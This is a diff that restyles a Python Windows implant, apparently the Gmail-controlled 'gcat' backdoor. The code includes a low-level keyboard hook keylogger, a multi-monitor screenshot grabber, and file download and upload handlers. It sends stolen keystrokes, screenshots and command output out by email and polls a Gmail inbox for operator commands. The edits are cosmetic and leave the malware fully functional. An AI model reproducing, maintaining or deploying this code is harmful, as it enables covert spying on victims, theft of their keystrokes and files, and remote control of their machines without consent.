@@ -141,8 +141,7 @@ class screenshot(threading.Thread):
             monitors = []
             callback = self.MONITORENUMPROC(_callback)
             windll.user32.EnumDisplayMonitors(0, 0, callback, 0)
-            for mon in monitors:
-                yield mon
+            yield from monitors
 
     def get_pixels(self, monitor):
         ''' Retrieve all pixels from a monitor. Pixels have to be RGB.
@@ -190,8 +189,11 @@ class screenshot(threading.Thread):
                 windll.gdi32.DeleteObject(bmp)
 
         # Replace pixels values: BGR to RGB
-        self.image[2:buffer_len:3], self.image[0:buffer_len:3] = \
-            self.image[0:buffer_len:3], self.image[2:buffer_len:3]
+        self.image[2:buffer_len:3], self.image[:buffer_len:3] = (
+            self.image[:buffer_len:3],
+            self.image[2:buffer_len:3],
+        )
+
         return self.image
 
     def save(self,
@@ -217,7 +219,7 @@ class screenshot(threading.Thread):
 
         # Monitors screen shots!
         for i, monitor in enumerate(self.enum_display_monitors(screen)):
-            if screen <= 0 or (screen > 0 and i + 1 == screen):
+            if screen <= 0 or i + 1 == screen:
                 fname = output
                 if '%d' in output:
                     fname = output.replace('%d', str(i + 1))
@@ -269,7 +271,7 @@ class screenshot(threading.Thread):
         raise ScreenshotError(err)
 
     def run(self):
-        img_name = genRandomString() + '.png'
+        img_name = f'{genRandomString()}.png'
         for filename in self.save(output=img_name, screen=-1):
             sendEmail({'cmd': 'screenshot', 'res': 'Screenshot taken'}, jobid=self.jobid, attachment=[os.path.join(os.getenv('TEMP') + img_name)])
 
@@ -310,7 +312,7 @@ class keylogger(threading.Thread):
         self.keys = ''
         self.start()
 
-    def installHookProc(self, ptr):                                           
+    def installHookProc(self, ptr):                                       
         self.hooked = ctypes.windll.user32.SetWindowsHookExA( 
                         WH_KEYBOARD_LL, 
                         ptr, 
@@ -318,9 +320,7 @@ class keylogger(threading.Thread):
                         0
         )
 
-        if not self.hooked:
-            return False
-        return True
+        return bool(self.hooked)
 
     def uninstallHookProc(self):                                                  
         if self.hooked is None:
@@ -332,14 +332,14 @@ class keylogger(threading.Thread):
         CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
         return CMPFUNC(fn)
 
-    def hookProc(self, nCode, wParam, lParam):                                              
+    def hookProc(self, nCode, wParam, lParam):                                          
         if wParam is not WM_KEYDOWN:
             return ctypes.windll.user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)
 
         self.keys += chr(lParam[0])
 
         if len(self.keys) > 100:
-            sendEmail({'cmd': 'keylogger', 'res': r'{}'.format(self.keys)}, self.jobid)
+            sendEmail({'cmd': 'keylogger', 'res': f'{self.keys}'}, self.jobid)
             self.keys = ''
 
         if (CTRL_CODE == int(lParam[0])) or (self.exit == True):
@@ -377,7 +377,7 @@ class download(threading.Thread):
             else:
                 sendEmail({'cmd': 'download', 'res': 'Path to file invalid'}, self.jobid)
         except Exception as e:
-            sendEmail({'cmd': 'download', 'res': 'Failed: {}'.format(e)}, self.jobid)
+            sendEmail({'cmd': 'download', 'res': f'Failed: {e}'}, self.jobid)
 
 class upload(threading.Thread):
 
@@ -396,7 +396,7 @@ class upload(threading.Thread):
                 fileh.write(b64decode(self.attachment))
             sendEmail({'cmd': 'upload', 'res': 'Success'}, self.jobid)
         except Exception as e:
-            sendEmail({'cmd': 'upload', 'res': 'Failed: {}'.format(e)}, self.jobid)
+            sendEmail({'cmd': 'upload', 'res': f'Failed: {e}'}, self.jobid)
 
 class lockScreen(threading.Thread):
 
@@ -480,7 +480,7 @@ def isAdmin():
     return ctypes.windll.shell32.IsUserAnAdmin()
 
 def getSysinfo():
-    return '{}-{}'.format(platform.platform(), os.environ['PROCESSOR_ARCHITECTURE'])
+    return f"{platform.platform()}-{os.environ['PROCESSOR_ARCHITECTURE']}"
 
 def detectForgroundWindows():
     #Stolen fom https://sjohannes.wordpress.com/2012/03/23/win32-python-getting-all-window-titles/
@@ -517,9 +517,9 @@ class sendEmail(threading.Thread):
     def run(self):
         sub_header = uniqueid
         if self.jobid:
-            sub_header = 'imp:{}:{}'.format(uniqueid, self.jobid)
+            sub_header = f'imp:{uniqueid}:{self.jobid}'
         elif self.checkin:
-            sub_header = 'checkin:{}'.format(uniqueid)
+            sub_header = f'checkin:{uniqueid}'
 
         msg = MIMEMultipart()
         msg['From'] = sub_header
@@ -534,7 +534,11 @@ class sendEmail(threading.Thread):
                 part = MIMEBase('application', 'octet-stream')
                 part.set_payload(open(attach, 'rb').read())
                 encoders.encode_base64(part)
-                part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
+                part.add_header(
+                    'Content-Disposition',
+                    f'attachment; filename="{os.path.basename(attach)}"',
+                )
+
                 msg.attach(part)
 
         while True:
@@ -560,16 +564,16 @@ def checkJobs():
             c.login(gmail_user, gmail_pwd)
             c.select("INBOX")
 
-            typ, id_list = c.uid('search', None, "(UNSEEN SUBJECT 'gcat:{}')".format(uniqueid))
+            typ, id_list = c.uid('search', None, f"(UNSEEN SUBJECT 'gcat:{uniqueid}')")
 
             for msg_id in id_list[0].split():
-                
+
                 #logging.debug("[checkJobs] parsing message with uid: {}".format(msg_id))
-                
+
                 msg_data = c.uid('fetch', msg_id, '(RFC822)')
                 msg = msgparser(msg_data)
                 jobid = msg.subject.split(':')[2]
-                
+
                 if msg.dict:
                     cmd = msg.dict['cmd'].lower()
                     arg = msg.dict['arg']
@@ -610,7 +614,7 @@ def checkJobs():
             c.logout()
 
             time.sleep(10)
-        
+
         except Exception as e:
             #logging.debug(format_exc())
             time.sleep(10)
